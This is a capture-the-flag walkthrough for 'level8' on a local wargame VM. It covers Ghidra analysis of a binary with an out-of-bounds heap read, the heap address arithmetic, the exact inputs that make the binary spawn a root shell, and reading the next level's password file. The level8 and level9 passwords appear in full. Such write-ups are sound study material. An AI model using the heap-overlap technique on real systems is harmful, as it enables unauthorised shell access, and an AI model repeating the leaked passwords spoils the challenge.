1. Download the binary from the server:
   scp -P 2222 level8@localhost:~/level8 .
   Password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9

2. Analyze the binary with Ghidra:
   - Command-line interface with 4 commands: auth, reset, service, login
   - auth command: malloc(4) - allocates only 4 bytes on heap
   - service command: strdup(arg) - allocates string on heap
   - login command: checks *(int *)(auth + 32) - out-of-bounds read!
   - If (auth + 32) is non-zero, spawns shell via system("/bin/sh")
   - Global variables: auth at 0x08049aac, service at 0x08049ab0

3. Connect to the VM via SSH:
   ssh level8@localhost -p 2222
   Password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9

4. Verify heap layout by running the program:
   ./level8
   
   Type: auth AAAA
   Output: 0x804a008, (nil)  ← auth allocated at 0x804a008
   
   Type: service BBBBBBBBBBBBBBBB
   Output: 0x804a008, 0x804a018  ← service allocated at 0x804a018
   
   Distance: 0x804a018 - 0x804a008 = 16 bytes (0x10)

5. Calculate the exploit:
   Goal: Make (auth + 32) read non-zero data
   
   auth points to: 0x804a008
   auth + 32 is:   0x804a008 + 0x20 = 0x804a028
   
   service points to: 0x804a018
   auth + 32 offset into service: 0x804a028 - 0x804a018 = 16 bytes
   
   Conclusion: If service is ≥16 bytes long, (auth + 32) will read 
   into service buffer and find non-zero data!

6. Execute the exploit:
   ./level8
   
   Enter these commands:
   auth AAAA
   service BBBBBBBBBBBBBBBB
   login
   
   Shell spawned!

7. Get the flag:
   cat /home/user/level9/.pass
   
   Password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

8. Exit and login as level9:
   su level9
